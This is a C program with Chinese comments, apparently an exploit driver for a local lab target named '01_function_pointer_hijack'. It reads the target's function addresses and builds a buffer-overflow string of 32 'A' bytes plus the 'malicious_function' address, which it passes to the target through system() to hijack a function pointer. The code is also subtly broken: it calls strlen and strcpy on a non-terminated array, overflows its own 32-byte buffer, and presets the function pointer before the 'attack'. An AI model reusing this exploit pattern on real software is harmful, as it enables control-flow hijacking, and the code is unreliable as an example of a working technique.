#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    // 首先获取当前运行时的恶意函数地址
    printf("获取当前运行时的函数地址...\n");
    FILE *fp = popen("./01_function_pointer_hijack \"short\"", "r");
    if (!fp) {
        printf("无法执行程序获取地址\n");
        return 1;
    }
    
    char line[256];
    unsigned long malicious_addr = 0;
    unsigned long legitimate_addr = 0;
    
    printf("程序输出:\n");
    while (fgets(line, sizeof(line), fp)) {
        printf("%s", line);
        if (strstr(line, "malicious_function地址:")) {
            sscanf(line, "malicious_function地址: %lx", &malicious_addr);
        }
        if (strstr(line, "legitimate_function地址:")) {
            sscanf(line, "legitimate_function地址: %lx", &legitimate_addr);
        }
    }
    pclose(fp);
    
    if (malicious_addr == 0) {
        printf("无法获取恶意函数地址\n");
        return 1;
    }
    
    printf("\n提取的地址:\n");
    printf("legitimate_function: 0x%lx\n", legitimate_addr);
    printf("malicious_function: 0x%lx\n", malicious_addr);
    
    // 构造攻击字符串
    char attack[40];
    memset(attack, 'A', 32);
    
    // 写入地址（小端序）
    for (int i = 0; i < 8; i++) {
        attack[32 + i] = (malicious_addr >> (i * 8)) & 0xFF;
    }
    
    printf("执行函数指针劫持攻击...\n");
    printf("恶意地址: 0x%lx\n", malicious_addr);
    printf("攻击字符串长度: %zu 字节\n", strlen(attack));
    
    // 显示攻击字符串的十六进制表示
    printf("攻击字符串内容: ");
    for (int i = 0; i < 40; i++) {
        printf("\\x%02x", (unsigned char)attack[i]);
    }
    printf("\n\n");
    
    // 直接调用vulnerable_function来测试攻击
    printf("直接调用vulnerable_function测试攻击...\n");
    
    // 这里我们需要重新实现vulnerable_function的逻辑来测试
    char buffer[32];
    void (*func_ptr)(void);
    
    // 初始化
    func_ptr = (void (*)(void))malicious_addr;
    
    printf("攻击前func_ptr: %p\n", (void*)func_ptr);
    
    // 执行溢出
    strcpy(buffer, attack);
    
    printf("攻击后buffer内容: %.40s\n", buffer);
    
    // 检查是否覆盖成功（这里只是演示，实际不能这样检查）
    printf("攻击字符串已准备好，现在执行目标程序...\n\n");
    
    // 执行攻击程序
    char cmd[1000];
    snprintf(cmd, sizeof(cmd), "./01_function_pointer_hijack \"%.*s\"", 40, attack);
    
    printf("执行命令: %s\n", cmd);
    int result = system(cmd);
    
    return result;
}
